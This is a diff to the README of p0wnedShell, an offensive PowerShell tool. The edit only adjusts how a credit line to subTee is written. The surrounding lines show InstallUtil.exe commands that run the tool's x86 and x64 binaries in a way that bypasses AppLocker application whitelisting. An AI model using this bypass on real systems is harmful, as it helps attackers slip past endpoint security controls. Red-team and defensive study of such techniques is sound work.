@@ -37,7 +37,7 @@ p0wnedShell uses the System.Management.Automation namespace, so make sure you ha
 
 Just the run the executables or...
 
-To run as x86 binary and bypass Applocker (credits go to subTee):
+To run as x86 binary and bypass Applocker (credits go to @subTee):
 
 ```
 cd \Windows\Microsoft.NET\Framework\v4.0.30319 (Or newer .NET version folder)
@@ -45,7 +45,7 @@ cd \Windows\Microsoft.NET\Framework\v4.0.30319 (Or newer .NET version folder)
 InstallUtil.exe /logfile= /LogToConsole=false /U C:\p0wnedShell\p0wnedShellx86.exe
 ```
 
-To run as x64 binary and bypass Applocker:
+To run as x64 binary and bypass Applocker (credits go to @subTee):
 
 ```
 cd \Windows\Microsoft.NET\Framework64\v4.0.30319 (Or newer .NET version folder)
